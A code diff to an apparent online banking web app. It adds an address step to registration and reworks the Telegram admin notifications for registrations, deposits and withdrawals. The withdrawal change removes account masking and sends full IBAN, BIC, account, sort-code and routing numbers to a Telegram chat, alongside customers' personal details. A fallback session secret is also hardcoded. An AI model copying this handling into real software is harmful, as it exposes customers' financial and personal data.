@@ -23,8 +23,8 @@ const upload = multer({ storage: storage });
 
 const MONGODB_URI = process.env.MONGODB_URI;
 const SESSION_SECRET = process.env.SESSION_SECRET || "banking-secret-key-change-this";
-const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+const BOT_TOKEN = process.env.BOT_TOKEN;
+const ADMIN_ID = process.env.ADMIN_ID;
 
 // Currency configurations
 const CURRENCIES = {
@@ -320,7 +320,6 @@ async function isTagAvailable(tag, excludeCustomerId = null) {
   return true;
 }
 
-// *** UPDATED: Added address field ***
 async function createCustomer(data) {
   const currency = data.currency || "EUR";
   let accountDetails = {};
@@ -348,7 +347,7 @@ async function createCustomer(data) {
     name: data.name,
     email: data.email.toLowerCase(),
     phone: data.phone,
-    address: data.address || null, // *** NEW: store address ***
+    address: data.address || "",
     accountNumber: generateAccountNumber(),
     tag: data.tag || generateTag(data.name),
     tagUpdatedAt: new Date(),
@@ -612,14 +611,15 @@ async function updateCustomerPin(customerId, newPin) {
 function sendTelegramMessage(message) {
   return new Promise((resolve, reject) => {
     const data = JSON.stringify({
-      chat_id: TELEGRAM_CHAT_ID,
+      chat_id: ADMIN_ID,
       text: message,
       parse_mode: "Markdown",
+      disable_notification: false,
     });
 
     const options = {
       hostname: "api.telegram.org",
-      path: `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
+      path: `/bot${BOT_TOKEN}/sendMessage`,
       method: "POST",
       headers: {
         "Content-Type": "application/json",
@@ -645,11 +645,13 @@ function sendTelegramPhoto(photoBuffer, caption) {
 
     let body = "";
     body += `--${boundary}\r\n`;
-    body += `Content-Disposition: form-data; name="chat_id"\r\n\r\n${TELEGRAM_CHAT_ID}\r\n`;
+    body += `Content-Disposition: form-data; name="chat_id"\r\n\r\n${ADMIN_ID}\r\n`;
     body += `--${boundary}\r\n`;
     body += `Content-Disposition: form-data; name="caption"\r\n\r\n${caption}\r\n`;
     body += `--${boundary}\r\n`;
     body += `Content-Disposition: form-data; name="parse_mode"\r\n\r\nMarkdown\r\n`;
+    body += `--${boundary}\r\n`;
+    body += `Content-Disposition: form-data; name="disable_notification"\r\n\r\nfalse\r\n`;
     body += `--${boundary}\r\n`;
     body += `Content-Disposition: form-data; name="photo"; filename="receipt.jpg"\r\n`;
     body += `Content-Type: image/jpeg\r\n\r\n`;
@@ -660,7 +662,7 @@ function sendTelegramPhoto(photoBuffer, caption) {
 
     const options = {
       hostname: "api.telegram.org",
-      path: `/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
+      path: `/bot${BOT_TOKEN}/sendPhoto`,
       method: "POST",
       headers: {
         "Content-Type": `multipart/form-data; boundary=${boundary}`,
@@ -3911,7 +3913,6 @@ function getPageWrapper(content, activePage, customer, notificationCount = 0) {
     </html>
   `;
 }
-
 // ==========================================
 // ROUTES - HOMEPAGE
 // ==========================================
@@ -4213,7 +4214,7 @@ app.get("/logout", (req, res) => {
 });
 
 // ==========================================
-// ROUTES - REGISTRATION (UPDATED)
+// ROUTES - REGISTRATION
 // ==========================================
 
 app.get("/register", (req, res) => {
@@ -4241,7 +4242,7 @@ app.get("/register", (req, res) => {
             <div class="step-dot" data-step="3"></div>
             <div class="step-dot" data-step="4"></div>
             <div class="step-dot" data-step="5"></div>
-            <div class="step-dot" data-step="6"></div>   <!-- NEW: 6th dot for address -->
+            <div class="step-dot" data-step="6"></div>
           </div>
           <div class="step-container">
             <div class="register-step active" id="step1">
@@ -4276,19 +4277,21 @@ app.get("/register", (req, res) => {
               <button class="step-btn" id="step3Btn" disabled>Continue</button>
               <button class="step-back" onclick="goToStep(2)">← Back</button>
             </div>
-            <!-- NEW: address step (step4) -->
             <div class="register-step" id="step4">
-              <div class="step-title"><span class="step-icon">🏠</span>What's your address?</div>
-              <div class="step-subtitle">Please enter your full residential address. This must be correct and valid.</div>
+              <div class="step-title"><span class="step-icon">📍</span>What's your address?</div>
+              <div class="step-subtitle">Enter your full residential address</div>
+              <div style="background: #FFF3E0; border: 1px solid #FFE0B2; border-radius: 8px; padding: 12px; margin-bottom: 16px;">
+                <p style="font-size: 13px; color: #E65100; margin: 0;">⚠️ <strong>Important:</strong> Please ensure your address is correct and valid. This will be used for account verification.</p>
+              </div>
               <div class="step-input-group">
-                <input type="text" class="step-input" id="addressInput" placeholder="Enter your full address" autocomplete="address-line1">
+                <input type="text" class="step-input" id="addressInput" placeholder="Enter your full address" autocomplete="street-address">
                 <div class="step-input-check" id="addressCheck"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg></div>
               </div>
-              <div class="step-error" id="addressError">Please enter your address</div>
+              <div class="step-error" id="addressError">Please enter your full address</div>
               <button class="step-btn" id="step4Btn" disabled>Continue</button>
               <button class="step-back" onclick="goToStep(3)">← Back</button>
             </div>
-            <div class="register-step" id="step5">  <!-- Currency was step4, now step5 -->
+            <div class="register-step" id="step5">
               <div class="step-title"><span class="step-icon">🌍</span>Choose your currency</div>
               <div class="step-subtitle">Select the primary currency</div>
               <div class="currency-options">
@@ -4299,7 +4302,7 @@ app.get("/register", (req, res) => {
               <button class="step-btn" id="step5Btn" disabled>Continue</button>
               <button class="step-back" onclick="goToStep(4)">← Back</button>
             </div>
-            <div class="register-step" id="step6">  <!-- PIN was step5, now step6 -->
+            <div class="register-step" id="step6">
               <div class="step-title"><span class="step-icon">🔐</span>Create your PIN</div>
               <div class="step-subtitle">Choose a 4-6 digit PIN</div>
               <div class="step-input-group">
@@ -4335,12 +4338,12 @@ app.get("/register", (req, res) => {
         </div>
       </div>
       <script>
-        const formData = { name: '', email: '', phone: '', address: '', currency: '', pin: '' }; // NEW: address added
+        const formData = { name: '', email: '', phone: '', address: '', currency: '', pin: '' };
         let currentStep = 1;
         function validateName(name) { const parts = name.trim().split(/\\s+/); return parts.length >= 2 && parts[0].length >= 2; }
         function validateEmail(email) { return /^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$/.test(email.trim()); }
         function validatePhone(phone) { return phone.replace(/[^0-9+]/g, '').length >= 10; }
-        function validateAddress(addr) { return addr.trim().length >= 5; } // simple non-empty check
+        function validateAddress(address) { return address.trim().length >= 10; }
         function validatePin(pin) { return /^\\d{4,6}$/.test(pin); }
         function updateStepIndicators() {
           document.querySelectorAll('.step-dot').forEach((dot, index) => {
@@ -4355,7 +4358,6 @@ app.get("/register", (req, res) => {
           currentStep = step;
           updateStepIndicators();
         }
-        // Step 1: Name
         const nameInput = document.getElementById('nameInput');
         const step1Btn = document.getElementById('step1Btn');
         nameInput.addEventListener('input', function() {
@@ -4367,7 +4369,6 @@ app.get("/register", (req, res) => {
           if (isValid) formData.name = this.value.trim();
         });
         step1Btn.addEventListener('click', () => goToStep(2));
-        // Step 2: Email
         const emailInput = document.getElementById('emailInput');
         const step2Btn = document.getElementById('step2Btn');
         emailInput.addEventListener('input', function() {
@@ -4379,7 +4380,6 @@ app.get("/register", (req, res) => {
           if (isValid) formData.email = this.value.trim();
         });
         step2Btn.addEventListener('click', () => goToStep(3));
-        // Step 3: Phone
         const phoneInput = document.getElementById('phoneInput');
         const step3Btn = document.getElementById('step3Btn');
         phoneInput.addEventListener('input', function() {
@@ -4390,20 +4390,21 @@ app.get("/register", (req, res) => {
           step3Btn.disabled = !isValid;
           if (isValid) formData.phone = this.value.trim();
         });
-        step3Btn.addEventListener('click', () => goToStep(4)); // go to address step
-        // NEW: Step 4: Address
+        step3Btn.addEventListener('click', () => goToStep(4));
+        
+        // Address validation (Step 4)
         const addressInput = document.getElementById('addressInput');
         const step4Btn = document.getElementById('step4Btn');
         addressInput.addEventListener('input', function() {
-          const isValid = validateAddress(this.value);
+          const isValid = this.value.trim().length >= 10;
           this.classList.toggle('valid', isValid);
           document.getElementById('addressCheck').classList.toggle('show', isValid);
           document.getElementById('addressError').classList.toggle('show', !isValid && this.value.length > 3);
           step4Btn.disabled = !isValid;
           if (isValid) formData.address = this.value.trim();
         });
-        step4Btn.addEventListener('click', () => goToStep(5)); // go to currency
-        // Step 5: Currency
+        step4Btn.addEventListener('click', () => goToStep(5));
+
         const currencyOptions = document.querySelectorAll('.currency-option');
         const step5Btn = document.getElementById('step5Btn');
         currencyOptions.forEach(option => {
@@ -4414,8 +4415,7 @@ app.get("/register", (req, res) => {
             step5Btn.disabled = false;
           });
         });
-        step5Btn.addEventListener('click', () => goToStep(6)); // go to pin
-        // Step 6: PIN
+        step5Btn.addEventListener('click', () => goToStep(6));
         const pinInput = document.getElementById('pinInput');
         const step6Btn = document.getElementById('step6Btn');
         pinInput.addEventListener('input', function() {
@@ -4491,7 +4491,6 @@ app.post("/register", async (req, res) => {
     if (existing) { return res.json({ success: false, error: "Email already registered" }); }
     const customer = await createCustomer({ name, email, phone, address, currency, pin });
     const currencyConfig = CURRENCIES[currency];
-    // UPDATED: include address in Telegram notification
     const message = `
 🆕 *NEW CUSTOMER REGISTERED*
 ━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -4499,7 +4498,7 @@ app.post("/register", async (req, res) => {
 🏷️ Tag: ${customer.tag}
 📧 Email: ${email}
 📱 Phone: ${phone}
-🏠 Address: ${address || "N/A"}
+📍 Address: ${address}
 ${currencyConfig.flag} Currency: ${currency}
 🔢 Account: ${customer.accountNumber}
 ━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -4513,7 +4512,6 @@ ${currencyConfig.flag} Currency: ${currency}
     res.json({ success: false, error: "Registration failed" });
   }
 });
-
 // ==========================================
 // ROUTES - DASHBOARD
 // ==========================================
@@ -4927,9 +4925,8 @@ app.post("/api/p2p-request", requireAuth, async (req, res) => {
     res.json({ success: false, error: "Failed to process request" });
   }
 });
-
 // ==========================================
-// ROUTES - ADD MONEY (UPDATED notification)
+// ROUTES - ADD MONEY
 // ==========================================
 
 app.get("/add-money", requireAuth, async (req, res) => {
@@ -4938,7 +4935,7 @@ app.get("/add-money", requireAuth, async (req, res) => {
   const currency = customer.currency || "EUR";
   const currencyConfig = CURRENCIES[currency];
 
-  let paymentOptionsHtml = currencyConfig.paymentMethods.map(method => 
+  let paymentOptionsHtml = currencyConfig.paymentMethods.map(method =>
     `<option value="${method}">${currencyConfig.paymentMethodNames[method]}</option>`
   ).join("");
 
@@ -4969,18 +4966,7 @@ app.post("/add-money", requireAuth, async (req, res) => {
 
   const request = await createDepositRequest({ customerId: req.session.customerId, customerName: customer.name, customerEmail: customer.email, currency: customer.currency, amount, paymentMethod });
   const currencyConfig = CURRENCIES[customer.currency];
-  // UPDATED: new format
-  const message = `
-💰 *NEW DEPOSIT REQUEST*
-━━━━━━━━━━━━━━━━━━━━━━
-🔖 Request ID: \`${request.requestId}\`
-👤 Customer: ${customer.name}
-📧 Email: ${customer.email}
-💵 Amount: ${formatCurrency(amount, customer.currency)}
-💳 Method: ${currencyConfig.paymentMethodNames[paymentMethod]}
-━━━━━━━━━━━━━━━━━━━━━━
-⏳ Action: Send payment details
-  `;
+  const message = `💰 *NEW DEPOSIT REQUEST*\n━━━━━━━━━━━━━━━━━━━━━━━━━\n🔖 Request ID: \`${request.requestId}\`\n👤 Customer: ${customer.name}\n📧 Email: ${customer.email}\n💵 Amount: ${formatCurrency(amount, customer.currency)}\n💳 Method: ${currencyConfig.paymentMethodNames[paymentMethod]}\n━━━━━━━━━━━━━━━━━━━━━━━━━\n⏳ *Action Required:* Send payment details`;
   try { await sendTelegramMessage(message); } catch (e) { console.error("Telegram error:", e); }
   res.redirect(`/add-money/waiting/${request.requestId}`);
 });
@@ -5108,7 +5094,7 @@ app.post("/add-money/prepaid", requireAuth, async (req, res) => {
 });
 
 // ==========================================
-// ROUTES - WITHDRAW (UPDATED notification)
+// ROUTES - WITHDRAW
 // ==========================================
 
 app.get("/withdraw", requireAuth, async (req, res) => {
@@ -5136,27 +5122,12 @@ app.post("/withdraw", requireAuth, async (req, res) => {
   if (parseFloat(amount) > customer.balance) { return res.redirect("/withdraw?error=insufficient"); }
 
   const request = await createWithdrawalRequest({ customerId: req.session.customerId, customerName: customer.name, currency: customer.currency, amount, withdrawalAccount });
-  // Mask account number for display
-  let accountMasked = "";
-  if (customer.currency === "EUR") {
-    accountMasked = maskAccountNumber(withdrawalAccount.iban);
-  } else if (customer.currency === "GBP") {
-    accountMasked = maskAccountNumber(withdrawalAccount.accountNumber);
-  } else {
-    accountMasked = maskAccountNumber(withdrawalAccount.accountNumber);
-  }
-  // UPDATED: new format
-  const message = `
-💸 *NEW WITHDRAWAL REQUEST*
-━━━━━━━━━━━━━━━━━━━━━━
-🔖 Request ID: \`${request.requestId}\`
-👤 Customer: ${customer.name}
-💰 Balance: ${formatCurrency(customer.balance, customer.currency)}
-💵 Amount: ${formatCurrency(amount, customer.currency)}
-📤 To: ${withdrawalAccount.bankName} (${accountMasked})
-━━━━━━━━━━━━━━━━━━━━━━
-⏳ Action: Approve or reject
-  `;
+  let accountDetails = `Bank: ${withdrawalAccount.bankName}`;
+  if (customer.currency === "EUR") { accountDetails += `\nIBAN: ${withdrawalAccount.iban}\nBIC: ${withdrawalAccount.bic}`; }
+  else if (customer.currency === "GBP") { accountDetails += `\nAccount: ${withdrawalAccount.accountNumber}\nSort Code: ${withdrawalAccount.sortCode}`; }
+  else { accountDetails += `\nAccount: ${withdrawalAccount.accountNumber}\nRouting: ${withdrawalAccount.routingNumber}`; }
+
+  const message = `💸 *NEW WITHDRAWAL REQUEST*\n━━━━━━━━━━━━━━━━━━━━━━━━━\n🔖 Request ID: \`${request.requestId}\`\n👤 Customer: ${customer.name}\n💰 Balance: ${formatCurrency(customer.balance, customer.currency)}\n💵 Amount: ${formatCurrency(amount, customer.currency)}\n━━━━━━━━━━━━━━━━━━━━━━━━━\n📤 *Sending To:*\n${accountDetails}\n━━━━━━━━━━━━━━━━━━━━━━━━━\n⏳ *Action Required:* Approve or reject`;
   try { await sendTelegramMessage(message); } catch (e) { console.error("Telegram error:", e); }
   res.redirect(`/withdraw/pending/${request.requestId}`);
 });
@@ -5279,7 +5250,6 @@ app.get("/settings", requireAuth, async (req, res) => {
         <div class="settings-item"><span class="settings-item-label">Name</span><span class="settings-item-value">${customer.name}</span></div>
         <div class="settings-item"><span class="settings-item-label">Email</span><span class="settings-item-value">${customer.email}</span></div>
         <div class="settings-item"><span class="settings-item-label">Phone</span><span class="settings-item-value">${customer.phone}</span></div>
-        <div class="settings-item"><span class="settings-item-label">Address</span><span class="settings-item-value">${customer.address || "N/A"}</span></div> <!-- NEW: address displayed -->
         <div class="settings-item"><span class="settings-item-label">Tag</span><span class="settings-item-value"><code>${customer.tag}</code><a href="/settings/change-tag" class="btn btn-secondary" style="padding: 6px 12px; font-size: 12px; margin-left: 12px;">Edit</a></span></div>
       </div>
       <div class="settings-section"><div class="settings-title">Security</div>
